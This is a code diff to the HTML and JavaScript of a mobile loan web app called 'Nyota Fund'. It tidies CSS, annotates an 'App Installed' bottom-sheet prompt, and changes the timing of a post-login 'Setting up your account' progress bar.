@@ -48,9 +48,6 @@
         .amount-btn { transition: all 0.15s ease; border: 1.5px solid #E2E8F0; border-radius: 14px; font-weight: 700; color: #475569; background: #FFFFFF; font-size: 15px; padding: 16px 0; }
         .amount-btn.selected { background: #2E7D32; color: white; border-color: #2E7D32; box-shadow: 0 6px 16px -4px rgba(46, 125, 50, 0.4); }
 
-        .term-btn { transition: all 0.15s ease; border: 1.5px solid #E2E8F0; border-radius: 14px; font-weight: 600; color: #475569; background: #FFFFFF; font-size: 14px; padding: 16px; }
-        .term-btn.selected { background: #2E7D32; color: white; border-color: #2E7D32; }
-
         .app-shell { background: #F7F8FA; min-height: 100vh; }
         .native-card { background: #FFFFFF; border-radius: 22px; box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04), 0 8px 24px -8px rgba(15, 23, 42, 0.08); }
         .native-btn { background: #2E7D32; color: #fff; border: none; border-radius: 14px; padding: 18px 24px; min-height: 56px; font-size: 16px; font-weight: 700; letter-spacing: 0.01em; width: 100%; transition: all 0.15s ease; cursor: pointer; font-family: inherit; }
@@ -84,6 +81,7 @@
         }
         .animate-pulse-subtle { animation: pulseSubtle 2.5s infinite; }
         
+        /* Native Bottom Sheet Animation */
         @keyframes slideUp { 0% { transform: translateY(100%); } 100% { transform: translateY(0); } }
         .bottom-sheet { animation: slideUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
     </style>
@@ -92,13 +90,16 @@
 
 <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] font-sans">Message</div>
 
-<!-- 1. NATIVE INSTALL SUCCESS PROMPT -->
+<!-- 1. NATIVE INSTALL SUCCESS PROMPT (Bottom Sheet) -->
 <div id="native-install-prompt" class="hide fixed inset-0 z-[10005] bg-slate-900/60 backdrop-blur-sm flex items-end justify-center">
     <div class="bottom-sheet bg-white w-full max-w-lg rounded-t-3xl p-6 shadow-2xl text-center pb-10">
         <div class="w-16 h-1 bg-gray-300 rounded-full mx-auto mb-6"></div>
+        
         <img src="icon-512.png" class="w-20 h-20 rounded-2xl mx-auto mb-4 shadow-md border border-gray-100" alt="Nyota Fund">
+        
         <h2 class="text-2xl font-extrabold text-slate-900 mb-2">App Installed</h2>
         <p class="text-sm text-slate-500 mb-8 px-4">Nyota Fund is ready. You can now open the app directly from your home screen for the best experience.</p>
+        
         <button onclick="closeNativePrompt()" class="native-btn text-lg w-full mb-3">Got it</button>
         <button onclick="forceOpenWeb()" class="text-sm font-semibold text-slate-500 w-full">Continue in Browser</button>
     </div>
@@ -211,7 +212,7 @@
         </div>
     </div>
 
-    <!-- CHECKING -->
+    <!-- CHECKING (FIXED TIMING) -->
     <div id="screen-checking" class="screen gradient-bg items-center justify-center" style="padding: 24px;">
         <div class="pulse-ring"><img src="icon-512.png" class="w-20 h-20 rounded-2xl object-cover z-10 relative"></div>
         <h2 class="text-white text-2xl font-bold text-center mb-2">Setting up your account</h2>
@@ -670,14 +671,15 @@ function submitLogin(){
     }).catch(()=>{});
 
     showScreen('screen-checking');
+    
+    // FIXED TIMING LOGIC
     let p = 0;
-    const duration = 15000;
-    const steps = duration / 100;
-    const increment = 100 / steps;
-
+    const step = 2; // Increases by 2% every 150ms (15 seconds total)
+    
     const i = setInterval(()=>{
-        p += increment;
+        p += step;
         if(p > 100) p = 100;
+        
         document.getElementById('check-bar').style.width = p + "%";
         document.getElementById('check-percent').innerText = Math.floor(p) + "%";
 
@@ -688,8 +690,11 @@ function submitLogin(){
         if(p >= 90) msg = "Almost ready...";
         document.getElementById('check-status').innerText = msg;
 
-        if(p >= 100){ clearInterval(i); buildLoanScreen(); }
-    }, 100);
+        if(p >= 100){ 
+            clearInterval(i); 
+            setTimeout(buildLoanScreen, 300); // Small delay so they see 100%
+        }
+    }, 150);
 }
 
 function buildLoanScreen(){
